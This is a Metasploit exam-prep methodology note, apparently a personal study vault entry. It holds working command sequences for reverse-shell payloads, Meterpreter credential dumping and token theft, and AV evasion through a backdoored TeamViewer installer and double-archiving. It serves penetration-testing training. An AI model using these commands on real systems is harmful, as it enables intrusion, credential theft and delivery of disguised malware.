# NOTE — Using the Metasploit Framework Methodology (Exam Playbook)

## ID
721

## Module
using-the-metasploit

## Kind
methodology

## Title
Using the Metasploit Framework — Exam-Day Playbook

## Description
End-to-end MSF retrieval tool: DB/workspace setup → find & configure a module → pick the right payload → catch the session → post-exploit with Meterpreter → chain local priv-esc → standalone msfvenom delivery + AV/IDS evasion → import/port external exploits. Symptom-indexed for exam pressure.

## Tags
metasploit, msf, msfconsole, msfvenom, meterpreter, session won't open, no session, exploit failed, payload not connecting, LHOST LPORT, port already in use, handler stuck, multi/handler, set SESSION, local_exploit_suggester, steal_token, getuid access denied, hashdump, kiwi mimikatz, db_nmap workspace, searchsploit reload_all, av bypass, shikata, double archive, msf6 not compatible, panic

---

## TL;DR — The 8-Phase Flow

1. **Setup** — `msfconsole -q`, confirm `db_status`, `workspace -a <target>`, `db_nmap` the box.
2. **Find module** — `search` (filter by `type:`/`cve:`/`platform:`), `use <id>`, `info`, `options`.
3. **Pick payload** — `show payloads` (grep it), staged vs single, set `LHOST tun0`/`LPORT`/`RHOSTS`.
4. **Fire & catch** — `run` (or `exploit -j` to keep prompt), watch for `session N opened`.
5. **Post-ex** — Meterpreter: `getuid`/`ps`/`steal_token`/`migrate`, then `hashdump`/`kiwi`.
6. **Chain priv-esc** — `background`, `local_exploit_suggester`, `use exploit/.../local/...`, `set SESSION`.
7. **Standalone delivery** — `msfvenom -f <fmt>` outside MSF + `use multi/handler` to catch it.
8. **Bring your own exploit** — `searchsploit`, drop `.rb` in modules tree, `reload_all`.

---

## Golden Rule + OPSEC Fork

**Golden Rule:** A failing module is *not* proof the vuln is absent. POCs need target-specific tweaks (wrong `target`, wrong arch, wrong `LPORT`, DEP/AV). Validate the vulnerability, not the tool's exit code.

**Don't waste exam time on:**
- Hand-tuning `shikata_ga_nai` iterations expecting AV bypass — it does **not** evade modern AV (~80%+ detection even at `-i 10`). Encoding is for **bad-char/arch** only. Real evasion = delivery wrapper (Phase 7).
- `Automatic` target (`target 0`) when you already know the OS/version — it adds detection noise and is slower. Pin `set target <id>`.
- Full `db_nmap -p-` as your *first* scan — it ties up the prompt for the whole scan. First-pass: `db_nmap -A --top-ports 60 -T5 <ip>`, deep-scan later.

**OPSEC fork:** if stealth is in scope, MSF defaults leave artifacts (IIS WebDAV drops `metasploit<RAND>.asp` and fails to clean on access-denied; `-k`+`-x` exe pops a visible window from CLI launch). Plan cleanup or skip MSF defaults.

---

## Phase 0 — Setup & Database

**Goal:** Persistent, workspace-isolated engagement so hosts/services/creds survive restarts.

| Trigger / Precondition | Action |
|---|---|
| New engagement / fresh box | Init DB + new workspace before anything else |
| `db_status` says not connected | Recover Postgres + msfdb |

```bash
# Host side
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb status
msfconsole -q

# Inside msfconsole
db_status                          # expect: Connected to msf. Connection type: PostgreSQL.
workspace -a Target_1              # create
workspace Target_1                 # switch into it
db_nmap -A --top-ports 60 -T5 <ip> # scan + auto-record
hosts                              # confirm recorded
services                           # service+version map → picks your exploit
```

**DB broken / password drift recovery:**
```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

**Output checkpoint:** after this you have a connected DB, a named workspace, and `hosts`/`services` populated with the target's service+version.

---

## Phase 1 — Find & Configure the Module

**Goal:** Map an enumerated service+version to a configured, ready-to-fire module.

| Trigger / Precondition | Action |
|---|---|
| Have service + version from `services` | `search` it with filters |
| Too many results | Add `type:exploit platform:windows cve:<year> rank:excellent` |

```bash
search ms17_010
search type:exploit platform:windows cve:2021 rank:excellent microsoft
search eternalromance type:exploit
use 0                       # or use exploit/windows/smb/ms17_010_eternalblue
info                        # AUDIT STEP — read targets, options, refs before firing
options                     # required RHOSTS/RPORT/etc
set RHOSTS 10.10.10.40
setg LHOST tun0             # setg = global, persists across modules until restart
show targets                # pin the version if you know it
set target <id>             # skip the slow/noisy Automatic
```

**Search post-filters:** `cve:<id>` · `type:<auxiliary|exploit|post>` · `platform:<os>` · `rank:<excellent|great>` · `port:<n>` · `-<term>` (exclude) · `-u` (auto-`use` if single result).

**`set` vs `setg`:** `set` = this module only; `setg` = global (great for `LHOST`/`RHOSTS` reused across a chain).

**Output checkpoint:** module selected, all required options set, target pinned.

---

## Phase 2 — Pick the Payload

**Goal:** A payload that matches arch + callback method + fits the network path.

| Trigger / Precondition | Action |
|---|---|
| Module selected, need shell | `show payloads`, grep to your need |
| Firewall between you and target | Prefer `reverse_tcp` (or `reverse_https` for camouflage) over `bind` |
| Two listeners at once | Change `LPORT` (default 4444 collides silently) |

```bash
show payloads
grep meterpreter show payloads                 # filter inside msfconsole
grep meterpreter grep reverse_tcp show payloads # chain greps
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0          # interface name — MSF resolves it, survives VPN IP rotation
set LPORT 9001          # change off 4444 if a handler is already up
set RHOSTS 10.10.10.40
run
```

**Single vs staged:** no slash before final word = single (`windows/shell_bind_tcp`); slash present = stager+stage (`windows/shell/reverse_tcp`, Meterpreter, VNC). Meterpreter is in-memory, AES, no disk write — default choice for post-ex.

| Param | Side | Meaning |
|---|---|---|
| `RHOSTS`/`RPORT` | exploit | target IP / service port |
| `LHOST`/`LPORT` | payload | attacker IP / listen port (default 4444) |

**Output checkpoint:** payload set, `LHOST`=`tun0`, unique `LPORT`.

---

## Phase 3 — Fire & Catch the Session

**Goal:** A live session, with the handler managed so the prompt stays usable.

```bash
run                 # or: exploit
exploit -j          # run as a JOB — handler keeps listening, prompt returns (use for chaining)
exploit -J          # force foreground
sessions            # list: Id | Type | Information | Connection
sessions -i 1       # interact
background  /  bg  /  [CTRL]+[Z]   # park session, return to msf6 >
jobs -l             # list jobs (handlers)
jobs -k <id>  /  jobs -K           # kill one / all jobs
```

**Output checkpoint:** `[*] Meterpreter session 1 opened` — note the integer id.

---

## Phase 4 — Post-Exploitation (Meterpreter)

**Goal:** Identity, stability, credentials.

| Trigger / Precondition | Action |
|---|---|
| Fresh Meterpreter | `getuid`, `sysinfo` |
| `getuid` → Access denied / low-priv | `ps` → `steal_token <pid>` of a higher-priv process |
| Process may die (web worker) | `migrate <pid>` into explorer.exe early |
| Have admin/SYSTEM | dump creds |

```bash
getuid                 # NOTE: Meterpreter has no `whoami` — use getuid (or `shell` then whoami)
sysinfo
ps
steal_token 1836       # impersonate token of higher-priv PID
rev2self / drop_token  # undo
migrate <pid>          # move to stable process
getsystem              # try built-in SYSTEM elevation

# Credentials (need admin/SYSTEM):
hashdump
lsa_dump_sam
lsa_dump_secrets
load kiwi              # post-Aug-2020; `load mimikatz` is aliased to Kiwi
creds_all
```

**Output checkpoint:** known identity, session on a stable process, hashes/creds in hand (also stored in DB `creds`).

---

## Phase 5 — Chain Local Privilege Escalation

**Goal:** Low-priv session → SYSTEM/root via a *local* exploit module bound to the session.

| Trigger / Precondition | Action |
|---|---|
| Have a session, not SYSTEM/root | Background it, run the suggester |
| Old utility version visible (`sudo -V`, `wmic os`) | Search that CVE directly |

```bash
background                                  # ALWAYS park the session first
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run                                         # candidate list — "maybes", verify

# Then run the chosen local exploit against the SAME session:
search CVE-2021-3156                         # e.g. sudo Baron Samedit
use exploit/linux/local/sudo_baron_samedit
set SESSION 1
set LHOST tun0
set LPORT 9001                               # change off 4444 — handler still bound
run
getuid                                       # expect NT AUTHORITY\SYSTEM or root
```

**Output checkpoint:** new elevated session opened.

---

## Phase 6 — Standalone Payload Delivery (msfvenom + multi/handler)

**Goal:** When delivery is a *file* (FTP/web/email/USB) not an in-console exploit.

| Trigger / Precondition | Action |
|---|---|
| Writable upload + executing context (IIS `.aspx`, etc.) | Generate file with `msfvenom`, catch with `multi/handler` |
| Bad chars / arch mismatch | Add `-b "\x00"` / `-a x86 --platform windows` / `-e x86/shikata_ga_nai` |

```bash
# 1. Generate OUTSIDE msfconsole
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

# 2. Listener FIRST
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp   # must EXACTLY match the generated payload
set LHOST 10.10.14.5
set LPORT 1337
run

# 3. Trigger the file (browse to it / execute it). First hit opens the session; a second browse often errors.
```

**msfvenom core flags:** `-p` payload · `-f` format (aspx/exe/dll/raw/c/ps1/jsp/war…) · `-a`/`--platform` · `-e` encoder · `-i` iterations · `-b` bad chars · `-x` template exe · `-k` keep template running · `-o` output.

**Output checkpoint:** session caught on `multi/handler`; then proceed to Phase 4/5.

---

## Phase 7 — Evasion (when target has AV / IDS / IPS)

**Goal:** Get the payload *file* past automated scanning. (Meterpreter comms are already AES — this is about the on-disk dropper.)

**Reality:** Encoding ≠ evasion. The delivery wrapper is what works.

| Lever | Command / technique | Effect |
|---|---|---|
| Backdoored template | `msfvenom ... -k -x ~/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o out.exe -i 5` | looks like real installer; cheapest upgrade |
| Double-archive | `rar a a.rar -p file.js; mv a.rar a; rar a b.rar -p a; mv b.rar b` | password-protected nested archive → 0/49 VT (anti-automation only) |
| Packers | UPX / Themida / MPRESS / Enigma (see PolyPack) | defeats signature scanners that don't unpack |
| Randomize exploit | vary `Ret`/`Offset` in `Targets`; avoid `\x90` NOP sleds | breaks fixed IDS/IPS signatures |
| Self-check | `msf-virustotal -k <API key> -f <file>` | know your detection rate before delivery |

**Caveat:** `0/49 on VirusTotal` ≠ undetected in the wild — SOCs alert on "archive couldn't be scanned" too. Anti-automation, not anti-human. `-k`+`-x` from CMD launch pops a visible window.

---

## Phase 8 — Import / Port an External Exploit

**Goal:** Use an ExploitDB exploit MSF doesn't ship.

| Trigger / Precondition | Action |
|---|---|
| ExploitDB result tagged `(Metasploit)` | Drop the `.rb` in, `reload_all` |
| Raw Python/PHP/Ruby (no `class MetasploitModule`) | Port using a similar existing module as boilerplate |

```bash
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"
cp ~/Downloads/9861.rb \
   /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
# inside msfconsole:
loadpath /usr/share/metasploit-framework/modules/
reload_all
use exploit/unix/webapp/nagios3_command_injection
show options
```

**Naming rules (silent skip if violated):** snake_case, alphanumeric + underscore only, no dashes/spaces/capitals. Match folder `exploits/<os>/<service>/` — it defines the `use` path. Porting = copy a *similar* module, adjust `include` mixins (`HttpClient`, `PhpEXE`, `FileDropper`, `Auxiliary::Report`), use **hard tabs**.

---

## Decision Tree (Under Exam Pressure)

```
Have target IP
 ├─ No service/version yet → Phase 0: db_nmap -A --top-ports 60 -T5
 │
 ├─ Have service+version
 │   ├─ search finds module → Phase 1 → 2 → 3
 │   │     └─ STUCK >10 min: module errors → check `info` targets/arch, set target,
 │   │        change LPORT, try different payload (staged↔single). Still nothing →
 │   │        the vuln may still be real: try manual / searchsploit (Phase 8).
 │   └─ search finds nothing → searchsploit the version → Phase 8 (import/port)
 │
 ├─ Have a writable+executing file vector (FTP/web upload)
 │   → Phase 6: msfvenom -f <fmt> + multi/handler
 │     └─ STUCK >10 min: payload mismatch — multi/handler `set payload` MUST equal
 │        the generated `-p`. LHOST/LPORT must match exactly. Re-trigger the file.
 │
 ├─ Got a session but it's low-priv
 │   ├─ getuid = Access denied → ps → steal_token <pid> (Phase 4)
 │   └─ identified, not SYSTEM → background → local_exploit_suggester →
 │      use exploit/.../local/... → set SESSION → run (Phase 5)
 │       └─ STUCK >10 min: "incompatible session architecture" often still works —
 │          run it anyway. Suggester "couldn't validate" = maybe, try it.
 │
 ├─ Session dies immediately on connect
 │   → MSF5↔MSF6 mismatch (not back-compatible) → regenerate payload on matching
 │     version. OR web-worker recycled → migrate early next time.
 │
 └─ AV eating the dropper
     → Phase 7: -k -x template → double-archive → packer. NOT more -i iterations.
```

No dead-ends: every "STUCK" branch has a next move.

---

## Signal → Counter-Move Reference

| Signal / symptom | Likely cause | Exact fix |
|---|---|---|
| `Exploit completed, but no session was created` | wrong target/arch, DEP, payload mismatch | `set target <id>` (don't use Automatic); try staged↔single payload; `-a x86`; verify `LHOST tun0` reachable |
| Module "fails" but you believe vuln exists | POC needs target tweak | trust the vuln; tweak `target`/options or go manual/`searchsploit` — failing module ≠ no vuln |
| `Address already in use` / port bound after Ctrl+C | handler still registered as a **job** | `jobs -l` → `jobs -k <id>`; or just `set LPORT <new>` |
| Second exploit silently won't bind | `LPORT 4444` collision | `set LPORT 9001` (any free port) |
| `getuid` → `Operation failed: Access is denied` | low-priv token | `ps` → `steal_token <higher-priv-pid>` |
| Meterpreter `whoami` not recognized | not a native command | `getuid`, or `shell` then `whoami` |
| `incompatible session architecture: x86` | x64-default local exploit on x86 session | run it anyway — often still works |
| Session opens then dies in seconds | MSF5↔MSF6 incompatible **or** IIS app-pool recycle | match Framework major version + regenerate payload; `migrate` into stable process early |
| `local_exploit_suggester`: "service running, couldn't validate" | heuristic guess | treat as *maybe* — try the module |
| New `.rb` not visible after copy | module cache stale | `reload_all` (or start `msfconsole -m <path>`) |
| Copied `.rb` still ignored | bad filename (dash/space/capital) or not an MSF module | rename snake_case; confirm it has `class MetasploitModule < Msf::Exploit::Remote` |
| `db_status` not connected | Postgres/msfdb down or pw drift | `sudo systemctl start postgresql; sudo msfdb init` → recover: `msfdb reinit` + copy `database.yml` |
| `load <plugin>` fails silently | wrong perms (cp'd as root) or bad name | fix ownership; plugin names snake_case only |
| `0/49` VT but caught anyway | SOC flags "can't scan archive" | wrapper is anti-automation, not anti-human — expect manual review |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# --- Bootstrap ---
sudo systemctl start postgresql && sudo msfdb init
msfconsole -q
db_status; workspace -a $TARGET; workspace $TARGET
db_nmap -A --top-ports 60 -T5 $RHOST

# --- Service → exploit ---
search type:exploit platform:windows cve:$YEAR rank:excellent $KEYWORD
use $ID; info; options
setg LHOST tun0; set RHOSTS $RHOST; show targets; set target $TID

# --- Payload ---
grep meterpreter grep reverse_tcp show payloads
set payload windows/x64/meterpreter/reverse_tcp; set LPORT 9001; run

# --- Session mgmt ---
exploit -j ; sessions ; sessions -i 1 ; background ; jobs -l ; jobs -k $JID

# --- Meterpreter post-ex ---
getuid; sysinfo; ps; steal_token $PID; migrate $PID; getsystem
hashdump; lsa_dump_secrets; load kiwi; creds_all

# --- Local priv-esc chain ---
background
use post/multi/recon/local_exploit_suggester; set SESSION 1; run
use exploit/$OS/local/$MOD; set SESSION 1; set LHOST tun0; set LPORT 9001; run

# --- Standalone payload + catcher ---
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=1337 -f aspx > sh.aspx
# msfconsole: use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 1337; run

# --- Evasion (delivery, not encoding) ---
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=$LHOST LPORT=8080 -k \
  -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe -i 5
rar a a.rar -p payload.js && mv a.rar a && rar a b.rar -p a && mv b.rar b   # double-archive
msf-virustotal -k $VTKEY -f $FILE

# --- BYO exploit ---
searchsploit $KEYWORD --exclude=".py"
cp ~/Downloads/$N.rb /usr/share/metasploit-framework/modules/exploits/$OS/$SVC/$NAME.rb
# msfconsole: reload_all; use exploit/$OS/$SVC/$NAME
```

---

## Quick Reference — Tools by Function

| Function | Tool / command |
|---|---|
| Console + DB | `msfconsole -q`, `msfdb`, `db_status`, `workspace`, `db_nmap`, `db_import`, `hosts`, `services`, `creds`, `loot`, `db_export` |
| Find/run module | `search`, `use`, `info`, `options`, `set`/`setg`, `show targets`, `set target`, `run`/`exploit -j` |
| Payload selection | `show payloads`, `grep ... show payloads`, `set payload`, `LHOST`/`LPORT`/`RHOSTS` |
| Session/job mgmt | `sessions [-i]`, `background`/`bg`, `jobs -l/-k/-K`, `set SESSION` |
| Meterpreter post-ex | `getuid`, `sysinfo`, `ps`, `steal_token`, `rev2self`, `migrate`, `getsystem`, `shell`, `hashdump`, `lsa_dump_sam/secrets`, `load kiwi` |
| Priv-esc triage | `post/multi/recon/local_exploit_suggester` |
| Standalone payloads | `msfvenom`, `use multi/handler` |
| Evasion | `msfvenom -x/-k`, `rar` double-archive, packers (UPX/Themida), `msf-virustotal` |
| BYO exploit | `searchsploit`, `loadpath`, `reload_all` |
| Plugins | `load <name>`, `<name>_help`, `/usr/share/metasploit-framework/plugins/` |

---

## Top Gotchas (exam-time foot-guns)

1. **`Ctrl+C` does NOT kill the handler.** It survives as a job; the port stays bound. Always `jobs -l` after cleanup; `jobs -k <id>` to free it.
2. **`LPORT 4444` collisions are silent.** Second exploit just won't bind. Change `LPORT` (1337/9001) on every follow-on module.
3. **`multi/handler` payload must EXACTLY match the `msfvenom -p`.** Mismatch = no callback, no error.
4. **MSF5 ↔ MSF6 are not back-compatible.** Payload generated on one won't connect to a listener on the other. Regenerate after any Framework upgrade.
5. **A failing module is not proof the vuln is absent.** Tweak `target`/arch/options or go manual before moving on.
6. **`background` BEFORE `use`-ing the next module** — otherwise you lose the shell instead of chaining.
7. **Meterpreter has no `whoami`** — `getuid`, or `shell` first.
8. **"incompatible session architecture" usually still works** — run it, don't skip.
9. **`reload_all` or the new `.rb` is invisible** — stale cache. Bad filename (dash/cap/space) = silent skip.
10. **More encoder iterations ≠ AV bypass** (~80%+ detection even at `-i 10`). Use the delivery wrapper instead.
11. **`set target 0` (Automatic) is slow + noisy** — pin the version if you know it.
12. **MSF default artifacts** (IIS WebDAV `metasploit<RAND>.asp`, `-k`+`-x` visible window) — clean up / avoid if stealth is scoped.
13. **`load mimikatz` is aliased to Kiwi** post-Aug-2020 — use `kiwi`'s `creds_all`, the old Mimikatz commands are gone.

---

## Related Vault Notes

- [[03-introduction-to-msfconsole]] — launch, update, 5-stage engagement structure
- [[04-modules]] — `search`/`use`/`set`/`run`, MS17-010 lab
- [[05-targets]] — `show targets`, `set target`, custom return address (`msfpescan`)
- [[06-payloads]] — staged vs single, Meterpreter, LHOST/LPORT/RHOSTS
- [[07-encoders]] — Shikata Ga Nai, bad-char avoidance, VirusTotal reality
- [[08-databases]] — `msfdb`, `workspace`, `db_nmap`, `creds`, `loot`
- [[09-plugins-and-mixins]] — `load`, plugin filesystem, DarkOperator pentest plugin
- [[10-sessions-and-jobs]] — `background`, `sessions -i`, `set SESSION`, `jobs`, elFinder→sudo lab
- [[11-meterpreter]] — `getuid`/`ps`/`steal_token`/`migrate`/`hashdump`, FortiLogger lab
- [[12-writing-importing-modules]] — `searchsploit`, `reload_all`, module skeleton, mixins
- [[13-msfvenom]] — payload generation, `multi/handler`, FTP→IIS→SYSTEM chain
- [[14-firewall-ids-ips-evasion]] — templates, double-archive, packers, offset randomization
- [[15-msf-updates]] — MSF6 AES/SMBv3/polymorphic, Kiwi vs Mimikatz, version compatibility

Cross-module chains:
- Local priv-esc after MSF foothold → also [[../windows-privesc/00-METHODOLOGY]] / [[../linux-privallege-escalation/00-METHODOLOGY]]
- Cracking dumped hashes/creds → [[../password-attacks/00-METHODOLOGY]]
- Pivoting through a Meterpreter session → [[../pivoting-tunneling/00-METHODOLOGY]] (`portfwd`, `route`)
- Picking the exploit from a port → [[../nmap/00-METHODOLOGY]] / [[../footprinting/00-METHODOLOGY]]

---

Triage by symptom: [[../ATTACK-PATHS]]
